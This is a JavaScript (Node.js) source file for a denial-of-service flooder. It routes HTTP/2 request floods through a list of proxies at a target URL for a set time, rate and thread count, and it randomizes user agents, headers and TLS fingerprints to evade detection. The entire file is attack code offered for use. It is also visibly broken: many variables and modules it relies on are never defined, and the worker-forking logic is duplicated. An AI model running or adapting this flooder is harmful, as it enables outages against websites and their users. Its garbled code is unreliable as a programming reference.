const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

lang_header = ['pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7', 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',],
 accept_header = [
    'application/json',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8',
    'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
  ],
  controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
  ],
 encoding_header = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
]

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {
});

if (process.argv.length < 7) {
  console.log('node tls target time rate thread get proxy'.rainbow);
  process.exit();
}

const headers = {};

function readLines(filePath) {
   return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
   return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
   return elements[randomIntn(0, elements.length)];
} 

const args = {
   target: process.argv[2],
   mode: ~~process.argv[7],
   time: ~~process.argv[3],
   Rate: ~~process.argv[4],
   threads: ~~process.argv[5],
   proxyFile: process.argv[6]
}

try {
    var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
     } catch(error){
         console.log('fail to load user-agents')
     }
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }

    // Kiểm tra nếu protocol adalah 'https:', maka ubah menjadi 'https:'
    if (parsedTarget.protocol === 'https:') {
        parsedTarget.protocol = 'https:';
    }

    const targetHost = parsedTarget.host;
    const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;

    setTimeout(() => {
        process.exit(1);
    }, process.argv[3] * 1000);
} 

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}

setTimeout(function() {
    process.exit(1);
}, process.argv[3] * 1000);

process.on('uncaughtException', function(er) {
});

process.on('unhandledRejection', function(er) {
});

function accept() {
    return accept_header[Math.floor(Math.random() * accept_header.length)];
  }
  
  function lang() {
    return lang_header[Math.floor(Math.random() * lang_header.length)];
  }
  
  function encoding() {
    return encoding_header[Math.floor(Math.random() * encoding_header.length)];
  }
  
  function controling() {
    return controle_header[Math.floor(Math.random() * controle_header.length)];
  }
  
  function cipher() {
    return cplist[Math.floor(Math.random() * cplist.length)];
  }
  
  function spoof() {
    return `${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}.${randstr.generate({ length:1, charset:"12" })}${randstr.generate({ length:1, charset:"012345" })}${randstr.generate({ length:1, charset:"012345" })}`;
  }
  
  function randomByte() {
    return Math.round(Math.random() * 256);
  }
  
  function randomIp() {
    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;
  
    return isPrivate(ip) ? ip : randomIp();
  }
  
  function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
  }

class NetSocket {
    constructor() {}

    https(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const keepAliveAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity });
        const headers = "CONNECT " + options.address + ":443 https/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(headers);

        var connection = http['get']({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
            ciphers: cipper,
            method: "CONNECT",
            agent: keepAliveAgent,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity,
        })


        connection.setTimeout(options.timeout * 10 * 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("https/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

function readUserAgents(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function getRandomUserAgent() {
    const userAgents = readUserAgents('ua.txt');
    return randomElement(userAgents);
}

const Header = new NetSocket();
headers["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)]
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers[":authority"] = randomString(10) + "." + parsedTarget.host;
headers["accept"] = randomHeaders['accept'];
headers["Accept-Encoding"] = "gzip, deflate, br";
headers["accept-language"] = headerFunc.lang();
headers["accept-encoding"] = headerFunc.encoding();
headers["Connection"] = Math.random() > 0.5 ? "keep-alive" : "close";
headers["upgrade-insecure-requests"] = Math.random() > 0.5;
headers["x-requested-with"] = "XMLhttpsRequest";
headers["pragma"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
headers["cache-control"] = Math.random() > 0.5 ? "no-cache" : "max-age=0";
headers[':method'] = mode;
headers['referer'] = target;
headers['sec-ch-ua'] = '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"';
headers['sec-ch-ua-mobile'] = '?0';
headers['sec-ch-ua-platform'] = '"Windows"';
headers['sec-fetch-dest'] = 'document';
headers['sec-fetch-mode'] = 'navigate';
headers['sec-fetch-user'] = '?1';

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    headers[":authority"] = parsedTarget.host
    headers["user-agent"] = getRandomUserAgent();
    headers["user-agent"] = keepAliveAgent ();

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Header.https(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 60000);

        for (let i = 0; i < rps; i++) {
          const req = client.request(header);
          req.setEncoding('utf8');

          req.on('data', (chunk) => {
            // data += chunk;
          });
          req.on("response", () => {
            req.close();
          })
        };

        const tlsOptions = {
            ALPNProtocols: ['h3', 'h2', 'https/1.1', 'h1', 'spdy/3.1', 'https/2+quic/43', 'https/2+quic/44', 'https/2+quic/45'],
            echdCurve: ["ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512", "ecdsa_brainpoolP384r1tls13_sha384", "ecdsa_brainpoolP512r1tls13_sha512", "ecdsa_sha1", "rsa_pss_pss_sha384", "GREASE:x25519:secp256r1:secp384r1", "GREASE:X25519:x25519", "GREASE:X25519:x25519:P-256:P-384:P-521:X448"],
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            maxRedirects: 20,
            followAllRedirects: true,
            curve: "GREASE:X25519:x25519", 
            secure: true,
            port: 443,
            secureProtocol: 'TLS_method',
            TLS_MAX_VERSION: '1.3',
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ["TLS_client_method", "TLS_method", "TLSv1_method", "TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method", "TLSv2_method", "TLSv2_1_method", "TLSv2_2_method", "TLSv2_3_method", "TLSv3_method", "TLSv3_1_method", "TLSv3_2_method", "TLSv3_3_method"],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
                           sessionTimeout: 5000,
          };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = https2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                enablePush: false,
                initialWindowSize: 1073741823,
                maxFrameSize: 16384,
                maxHeaderListSize: 32768,
                enableConnectProtocol: true,
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            session: Math.random() > 0.5 ? undefined : undefined
        });

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
                    const request = client.request(headers)
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
